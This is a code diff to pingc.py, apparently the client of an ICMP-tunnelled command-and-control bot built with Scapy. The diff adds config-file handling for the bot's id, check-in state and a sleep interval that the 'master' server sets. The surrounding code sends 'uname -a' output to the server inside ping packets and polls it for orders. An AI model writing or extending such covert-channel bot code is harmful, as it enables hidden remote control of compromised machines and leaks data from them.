@@ -6,29 +6,76 @@
 #  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
 # Usage: ./pingc.py <IP>
 
+import fileinput
 import sys
 import time
 import signal
 import subprocess as sub
+from ConfigParser import SafeConfigParser
 from scapy.all import *
+
+
+def getSleep():
+	cp = SafeConfigParser()
+        cp.optionxform = str # Preserves case sensitivity
+        cp.readfp(open('pingc.conf', 'r'))
+        section = 'Main'
+        sleep = cp.get(section,'sleep')
+	print "[*] Sleeping for %s seconds" % sleep
+	time.sleep(int(sleep))
+	return	
+
+def setSleep(sleep):
+	cp = SafeConfigParser()
+        cp.optionxform = str # Preserves case sensitivity
+        cp.readfp(open('pingc.conf', 'r'))
+        section = 'Main'
+        options = {'sleep': sleep}
+        for option, value in options.items():
+                cp.set(section, option, value)
+        cp.write(open('pingc.conf', 'w'))
 
 
 def getId():
 	#print "[D] Getting bot Id"
-	conf_file = open('pingc.conf','r')
-	id='null'
-	for line in conf_file:
-		if 'id=' in line:
-			id=line[3:]
-	#print "[D] Return id: " + id
+	cp = SafeConfigParser()
+        cp.optionxform = str # Preserves case sensitivity
+        cp.readfp(open('pingc.conf', 'r'))
+        section = 'Main'
+        id = cp.get(section,'id')
 	return id	
 
-def retrieveId(botId):
+def setId(botId):
 	#print "[D] Writing bot Id: ",botId
-	conf_file = open('pingc.conf','w')
-	idstr="id="+str(botId)
-	conf_file.write(idstr)
-	conf_file.close()
+	cp = SafeConfigParser()
+        cp.optionxform = str # Preserves case sensitivity
+        cp.readfp(open('pingc.conf', 'r'))
+        section = 'Main'
+        options = {'checkedin': '1',
+               'id': botId}
+        for option, value in options.items():
+                cp.set(section, option, value)
+        cp.write(open('pingc.conf', 'w'))
+
+	#config = conf_file.read()
+	
+	#for line in fileinput.input(conf_file, inplace=1):
+        #	if 'id=' in line:
+	#		print "[D] Found id, changing to %s" % botId
+	#		curId = line[3:]
+         #   		line = line.replace(curId,botId)
+	#	elif 'checkedin' in line:
+	#		print "[D] Found checkedin, setting to true"
+	#		line = line.replace('checkedin=0','checkedin=1')
+	#		sys.stdout.write(line)
+	#conf_file.close()
+
+def active():
+	cp = SafeConfigParser()
+        cp.optionxform = str # Preserves case sensitivity
+        cp.readfp(open('pingc.conf', 'r'))
+        section = 'Main'
+        return cp.get(section,'checkedin')
 
 def handler(signum, frame):
         print 'Bye!'
@@ -59,14 +106,18 @@ def sendPingRequest(command,botId):
 		packet=IP(dst=sys.argv[1])/ICMP()/str(command)
 	else:
 		packet=IP(dst=sys.argv[1])/ICMP(id=int(botId))/str(command)
-        packet.show()
+        #packet.show()
         print "[*] Request sent to C2 server: " + command
-	p=sr1(packet,timeout=10)
-        p.show()
+	try:
+		p=sr1(packet,timeout=10)
+        except:
+		print "[X] Error receiving packet"
+	#p.show()
 	if p:
 		return p
 	else:
 		return
+	
 
 def processReply(p):
 	try:
@@ -107,18 +158,14 @@ def processReply(p):
 		seconds = response[6:]
                 print "[*] Master says sleep for %s seconds" % (seconds)
                 print "[*] Sleeping..."
-                time.sleep(int(seconds))
-		botId=getId()
-		sendStr="What shall I do master?"
-                p=sendPingRequest(sendStr, botId)
-                processReply(p)
+                setSleep(seconds)
 	elif 'id=' in response:
 		print "[*] Checked in...placing id in conf file"
-		retrieveId(response[3:])
+		setId(response[3:])
 
 def main(argv):
-	id = getId()
-	if id=='null':
+	if int(active()) != 1:
+		print "[*] Not checked in...checking in now"
 		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                 output, errors = proc.communicate()
                 p=sendPingRequest('Checkin %s' % output,123456789)
@@ -126,8 +173,6 @@ def main(argv):
                         processReply(p)
                 #print output
                 print errors
-		if p:
-			processReply(p)
 		#print "[D] id==null"
 	while True:
 		if len(argv) < 1:
@@ -142,8 +187,7 @@ def main(argv):
 		p=sendPingRequest(sendStr, id)
 		if p:
 			processReply(p)
-		print "[*] Sleeping now..."
-		time.sleep(300)
+		getSleep()
 
 if __name__ == "__main__":
    main(sys.argv[1:])
